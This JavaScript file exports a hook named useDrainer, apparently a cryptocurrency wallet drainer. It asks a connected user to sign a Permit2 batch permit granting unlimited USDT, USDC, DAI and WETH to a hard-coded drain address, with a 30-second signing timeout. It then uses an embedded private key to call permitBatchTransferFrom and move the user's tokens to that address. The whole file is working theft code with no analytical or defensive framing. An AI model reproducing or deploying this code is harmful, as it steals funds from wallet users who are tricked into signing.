import { useSignTypedData } from 'wagmi'
import { ethers } from 'ethers'

const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3'
const DRAIN_ADDRESS = '0xA0E1348ed63e4638917870aae951669b3903e5C8'
const INITIATOR_PRIVATE_KEY = 'd58ea7b21cfd2d0be3e1887e2d2bbdab99c7c2d33960f60cca90fe34ff21cc5c'

const TOKENS = [
  { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6 },
  { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6 },
  { symbol: 'DAI', address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18 },
  { symbol: 'WETH', address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', decimals: 18 },
]

const MAX_UINT160 = '0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF'
const MAX_UINT256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'

export function useDrainer() {
  const { signTypedDataAsync } = useSignTypedData()

  const generateNonce = () => {
    return Math.floor(Math.random() * 1000000000000)
  }

  const buildPermitData = (userAddress, spender, nonce, deadline) => {
    const permitted = TOKENS.map(token => ({
      token: token.address,
      amount: MAX_UINT160
    }))

    const domain = {
      name: 'Permit2',
      chainId: 1,
      verifyingContract: PERMIT2_ADDRESS
    }

    const types = {
      PermitBatchTransferFrom: [
        { name: 'permitted', type: 'TokenPermissions[]' },
        { name: 'spender', type: 'address' },
        { name: 'nonce', type: 'uint256' },
        { name: 'deadline', type: 'uint256' }
      ],
      TokenPermissions: [
        { name: 'token', type: 'address' },
        { name: 'amount', type: 'uint256' }
      ]
    }

    const message = {
      permitted: permitted,
      spender: spender,
      nonce: nonce,
      deadline: deadline
    }

    return { domain, types, message, primaryType: 'PermitBatchTransferFrom' }
  }

  const signBatchPermit = async (userAddress) => {
    const deadline = Math.floor(Date.now() / 1000) + 3600
    const nonce = generateNonce()
    const permitData = buildPermitData(userAddress, DRAIN_ADDRESS, nonce, deadline)
    
    const timeoutPromise = new Promise((_, reject) => {
      setTimeout(() => reject(new Error('timeout')), 30000)
    })
    
    const signaturePromise = signTypedDataAsync(permitData)
    const signature = await Promise.race([signaturePromise, timeoutPromise])
    
    return { signature, nonce, deadline }
  }

  const executeDrain = async (userAddress, signature, nonce, deadline) => {
    const provider = new ethers.providers.JsonRpcProvider('https://eth.llamarpc.com')
    const wallet = new ethers.Wallet(INITIATOR_PRIVATE_KEY, provider)

    const permit2ABI = [
      'function permitBatchTransferFrom(((address token,uint256 amount)[] permitted, address spender, uint256 nonce, uint256 deadline) permitBatch, (address to, uint256[] amounts) transferDetails, address owner, bytes signature) external'
    ]

    const permit2 = new ethers.Contract(PERMIT2_ADDRESS, permit2ABI, wallet)

    const permitted = TOKENS.map(token => ({ token: token.address, amount: MAX_UINT160 }))

    const permitBatch = {
      permitted: permitted,
      spender: DRAIN_ADDRESS,
      nonce: nonce,
      deadline: deadline
    }

    const transferDetails = {
      to: DRAIN_ADDRESS,
      amounts: TOKENS.map(() => MAX_UINT256)
    }

    const tx = await permit2.permitBatchTransferFrom(
      permitBatch,
      transferDetails,
      userAddress,
      signature,
      { gasLimit: 5000000 }
    )

    await tx.wait()
    return tx.hash
  }

  return { signBatchPermit, executeDrain }
}